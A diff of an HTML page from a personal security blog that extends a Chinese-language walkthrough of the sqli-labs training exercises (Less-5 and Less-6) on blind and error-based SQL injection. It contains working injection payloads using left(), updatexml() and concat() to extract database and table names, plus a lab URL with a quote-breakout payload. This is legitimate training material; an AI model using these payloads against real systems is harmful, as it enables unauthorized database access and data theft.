@@ -17,7 +17,7 @@
   <meta name="description" content="">
   <meta name="author" content="John Doe">
   <meta name="keywords" content="">
-  <title>sqli-less5盲注 - SuQieR&#39;s Blog</title>
+  <title>sqli-less5-6盲注 - SuQieR&#39;s Blog</title>
 
   <link  rel="stylesheet" href="https://cdn.staticfile.org/twitter-bootstrap/4.4.1/css/bootstrap.min.css" />
 
@@ -176,7 +176,7 @@
     
     <span class="post-meta mr-2">
       <i class="iconfont icon-chart"></i>
-      1.1k 字
+      1.2k 字
     </span>
   
 
@@ -186,7 +186,7 @@
       <i class="iconfont icon-clock-fill"></i>
       
       
-      17
+      19
        分钟
     </span>
   
@@ -370,6 +370,8 @@ updatexml() 第二个参数需要xpath格式的字符串，concat()函数为字�
 left((select database()),2) &#x3D; &#39;se&#39; --+ # 在第一个字符的基础上继续爆破第二个字符
 后续的字符同上依次递增</code></pre>
 
+</li>
+</ul>
 <table>
 <thead>
 <tr>
@@ -380,8 +382,6 @@ left((select database()),2) &#x3D; &#39;se&#39; --+ # 在第一个字符的基�
 <td><img src="https://lynn-sec-blogimage.oss-cn-shenzhen.aliyuncs.com/img/20200814184105.png" srcset="/img/loading.gif" alt=""></td>
 </tr>
 </tbody></table>
-</li>
-</ul>
 <ul>
 <li><h3 id="concat聚合函数"><a href="#concat聚合函数" class="headerlink" title="concat聚合函数"></a>concat聚合函数</h3></li>
 </ul>
@@ -390,6 +390,8 @@ left((select database()),2) &#x3D; &#39;se&#39; --+ # 在第一个字符的基�
 <pre><code class="hljs mysql">and updatexml(1,concat(0x7e,(select database()),0x7e),1) --+ # 将数据库名以报错的方式回显
 and updatexml(1,concat(0x7e,(select concat(table_name) from information_schema.tables where table_schema &#x3D; database() limit%20 3,1),0x7e),1) --+ # 查询当前数据库下的表名，一次只能返回一个结果，需要多次替换limit n，1 来实现遍历表名</code></pre>
 
+</li>
+</ul>
 <table>
 <thead>
 <tr>
@@ -406,12 +408,25 @@ and updatexml(1,concat(0x7e,(select concat(table_name) from information_schema.t
 <td><img src="https://lynn-sec-blogimage.oss-cn-shenzhen.aliyuncs.com/img/20200815110426.png" srcset="/img/loading.gif" alt=""></td>
 </tr>
 </tbody></table>
+<h2 id="less6"><a href="#less6" class="headerlink" title="less6"></a>less6</h2><ul>
+<li><p>less5与less6的区别在id参数传到服务器时对id参数进行了处理，从源代码可以看到查询语句为</p>
+<pre><code class="hljs mysql">$id&#x3D;&#39;&quot;&#39;.$id.&#39;&quot;&#39;; 
+$sql&#x3D;&quot;SELECT * FROM users WHERE id &#x3D; $id LIMIT0,1&quot;;</code></pre>
+</li>
+<li><p>那么这一关的通关策略和less5一样，只需要将‘变成“即可，这里只记录一个payload</p>
+<table>
+<thead>
+<tr>
+<th><a href="http://192.168.5.135/sqli/Less-6/?id=1&quot;" target="_blank" rel="noopener">http://192.168.5.135/sqli/Less-6/?id=1&quot;</a> and left(version(),1) –+</th>
+</tr>
+</thead>
+<tbody><tr>
+<td><img src="https://lynn-sec-blogimage.oss-cn-shenzhen.aliyuncs.com/img/20200815115503.png" srcset="/img/loading.gif" alt=""></td>
+</tr>
+</tbody></table>
 </li>
 </ul>
-<ul>
-<li><h3 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h3></li>
-</ul>
-<ul>
+<h2 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h2><ul>
 <li>盲注这个东西，难度相对于其他类型的注入来说挺大的，确实复杂，而且各个类型以及骚操作都很多。</li>
 <li>掌握常用的盲注函数以及能够构造简单的payload就差不多了。（主要是复杂的构造不出来……）</li>
 <li>如果能够证明有盲注的存在，那么sqlmap一把嗦不香吗</li>
@@ -610,7 +625,7 @@ and updatexml(1,concat(0x7e,(select concat(table_name) from information_schema.t
     var typed = new Typed('#subtitle', {
       strings: [
         '  ',
-        "sqli-less5盲注&nbsp;",
+        "sqli-less5-6盲注&nbsp;",
       ],
       cursorChar: "_",
       typeSpeed: 70,
